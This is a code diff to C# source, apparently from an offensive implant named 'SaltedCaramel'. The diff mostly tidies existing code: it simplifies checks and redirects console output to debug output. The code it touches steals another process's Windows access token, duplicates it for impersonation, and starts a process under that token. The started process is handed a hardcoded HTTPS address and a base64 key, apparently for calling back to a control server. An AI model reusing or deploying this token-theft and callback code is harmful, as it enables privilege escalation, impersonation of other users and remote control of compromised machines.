@@ -74,10 +74,8 @@ namespace SaltedCaramel
                 {
                     bool procToken = OpenProcessToken(procHandle.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, out tokenHandle);
 
-                    if (procToken == false) // Check if OpenProcessToken was successful
-                    {
+                    if (!procToken) // Check if OpenProcessToken was successful
                         throw new Exception(Marshal.GetLastWin32Error().ToString());
-                    }
 
                     Debug.WriteLine("[+] StealToken - OpenProcessToken: " + procToken);
 
@@ -87,10 +85,8 @@ namespace SaltedCaramel
                         bool duplicateToken = DuplicateTokenEx(tokenHandle, (uint)TokenAccessLevels.MaximumAllowed, IntPtr.Zero, (uint)TokenImpersonationLevel.Impersonation,
                             TOKEN_TYPE.TokenImpersonation, out stolenHandle);
 
-                        if (duplicateToken == false) // Check if DuplicateTokenEx was successful
-                        {
+                        if (!duplicateToken) // Check if DuplicateTokenEx was successful
                             throw new Exception(Marshal.GetLastWin32Error().ToString());
-                        }
 
                         Debug.WriteLine("[+] StealToken - DuplicateTokenEx: " + duplicateToken);
                         Debug.WriteLine("[+] StealToken successful, got token with handle: " + stolenHandle);
@@ -117,31 +113,33 @@ namespace SaltedCaramel
 
         }
 
-        public static void Impersonate(int procId, string file)
+        internal static bool Impersonate(int procId, string file)
         {
             IntPtr tokenHandle = IntPtr.Zero;
             stolenHandle = IntPtr.Zero;
 
             SafeWaitHandle procHandle = new SafeWaitHandle(Process.GetProcessById(procId).Handle, true);
-            Console.WriteLine("Process handle: true");
+            Debug.WriteLine("Process handle: true");
 
             bool procToken = OpenProcessToken(procHandle.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, out tokenHandle);
-            Console.WriteLine("OpenProcessToken: " + procToken);
+            Debug.WriteLine("OpenProcessToken: " + procToken);
 
             bool duplicateToken = DuplicateTokenEx(tokenHandle, (uint)TokenAccessLevels.MaximumAllowed, IntPtr.Zero, (uint)TokenImpersonationLevel.Impersonation,
                 TOKEN_TYPE.TokenImpersonation, out stolenHandle);
-            Console.WriteLine("DuplicateTokenEx: " + duplicateToken);
+            Debug.WriteLine("DuplicateTokenEx: " + duplicateToken);
 
             PROCESS_INFORMATION newProc = new PROCESS_INFORMATION();
             IntPtr startupInfo = IntPtr.Zero;
             string directory = "C:\\Temp";
             bool createProcess = CreateProcessWithTokenW(stolenHandle, IntPtr.Zero, file, "https://192.168.38.192 igOa0opMZdHj2VxA6qbsjCUltgaHBh+vF7uOG4bDd0Y=", IntPtr.Zero, IntPtr.Zero, directory, ref startupInfo, out newProc);
-            Console.WriteLine("Started process with ID " + newProc.dwProcessId);
-            Console.WriteLine("CreateProcess return code: " + createProcess);
-            Console.WriteLine(Marshal.GetLastWin32Error());
+            Debug.WriteLine("Started process with ID " + newProc.dwProcessId);
+            Debug.WriteLine("CreateProcess return code: " + createProcess);
+            Debug.WriteLine(Marshal.GetLastWin32Error());
 
             CloseHandle(tokenHandle);
             procHandle.Close();
+
+            return duplicateToken;
         }
     }
 }
